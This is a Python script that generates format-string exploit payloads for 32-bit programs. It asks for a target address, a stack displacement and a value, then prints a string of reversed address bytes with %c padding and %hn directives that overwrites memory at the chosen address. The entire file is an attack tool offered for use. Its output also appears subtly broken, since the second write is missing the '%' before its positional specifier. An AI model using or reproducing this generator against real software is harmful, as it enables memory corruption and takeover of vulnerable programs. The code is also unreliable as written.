# Do some math for 32-bit string bugs


def address_calculator(target, displacement, value):
    upper_part = str(value)[4:]
    lower_part = str(value)[:4]
    tg = str(target)
    first_address = [tg[i:i + 2] for i in range(0, 8, 2)]
    second_address = [tg[i:i + 2] for i in range(0, 8, 2)]

    if int(lower_part, 16) < int(upper_part, 16):
        first_round = lower_part
        second_round = upper_part
        x = int("0x" + first_address[3], 16) + 2
        first_address[3] = str(format(x, 'x'))

    else:
        first_round = upper_part
        second_round = lower_part
        x = int("0x" + second_address[3], 16) + 2
        second_address[3] = str(format(x, 'x'))

    char_first = int(first_round, 16) - 8
    char_second = int(second_round, 16) - (char_first + 8)
    first_address.reverse()
    first_address = "\\x" + "\\x".join(first_address)
    second_address.reverse()
    second_address = "\\x" + "\\x".join(second_address)
    first_pos = "%05d" % int(displacement)
    second_pos = "%05d" % (int(displacement)+1)
    print("\n The string you want is: ")
    print(first_address + second_address + "%" + str(char_first) + "c" + "%"+ first_pos + "$hn" + "%" + str(char_second)
          + "c" + second_pos + "$hn")


if __name__=="__main__":
    # target = "08049698"
    # displacement = 2
    # value = "b7eb1f10"
    print("All the value above (except the displacement position) must be valid hexadecimal addresses")
    target = input("Give a target address (where to write): ")
    displacement = input("Give a displacement position (where 'where to write' is placed on the stack): ")
    value = input("Give a value address (what to write at the target address): ")
    address_calculator(target, displacement, value)